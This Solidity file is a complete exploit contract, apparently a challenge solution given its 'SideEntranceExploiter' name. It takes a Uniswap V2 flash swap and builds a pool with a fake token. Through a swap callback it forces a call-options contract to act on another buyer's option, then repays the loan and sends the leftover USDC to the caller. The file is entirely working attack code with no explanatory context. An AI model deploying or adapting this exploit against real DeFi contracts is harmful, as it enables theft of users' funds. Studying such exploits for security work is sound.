// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Factory {
    function getPair(address, address) external returns (address);
}

interface IUniswapRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256, uint256, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256, uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external returns (address);
    function token1() external returns (address);
    function approve(address, uint256) external returns (bool);
}

interface ICallOptions {
    function getBuyer(bytes32) external returns (address);
}

contract SideEntranceExploiter {
    IUniswapV2Factory factory;
    IUniswapRouter router;
    IUniswapV2Pair usdcDaiPair;
    ICallOptions callOptions;
    IERC20 usdc;
    IERC20 fakeToken;

    bytes32 id;

    constructor(
        address _factoryAddress,
        address _routerAddress,
        address _usdcDaiPairAddress,
        address _callOptionsAddress,
        address _usdcAddress,
        address _fakeTokenAddress
    ) {
        factory = IUniswapV2Factory(_factoryAddress);
        router = IUniswapRouter(_routerAddress);
        usdcDaiPair = IUniswapV2Pair(_usdcDaiPairAddress);
        callOptions = ICallOptions(_callOptionsAddress);
        usdc = IERC20(_usdcAddress);
        fakeToken = IERC20(_fakeTokenAddress);
    }

    function attack(bytes32 _id, uint256 amount) public {
        id = _id;
        usdcDaiPair.swap(amount, 0, address(this), bytes("not empty"));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 amount = amount0 > amount1 ? amount0 : amount1;

        usdc.approve(address(router), amount);
        fakeToken.approve(address(router), amount);

        (,, uint256 liquidity) = router.addLiquidity( // creates USDC-fakeToken pair
        address(usdc), address(fakeToken), amount, amount, 0, 0, address(this), block.timestamp);

        address optionBuyer = callOptions.getBuyer(id);

        bytes memory data = abi.encode(id, optionBuyer, 99_000e18);

        IUniswapV2Pair usdcFakeTokenPair = IUniswapV2Pair(factory.getPair(address(usdc), address(fakeToken)));

        uint256 amount0Out = usdcFakeTokenPair.token0() == address(usdc) ? amount - 1 : 0;
        uint256 amount1Out = amount0Out == 0 ? amount - 1 : 0;

        IUniswapV2Pair(usdcFakeTokenPair).swap(amount0Out, amount1Out, address(callOptions), data);

        usdcFakeTokenPair.approve(address(router), liquidity);

        router.removeLiquidity(address(usdc), address(fakeToken), liquidity, 0, 0, address(this), block.timestamp);

        uint256 loanAmount = amount * 1000 * 1e18 / 997 / 1e18 + 1;
        usdc.transfer(address(usdcDaiPair), loanAmount);

        usdc.transfer(tx.origin, usdc.balanceOf(address(this))); // lazy
    }
}
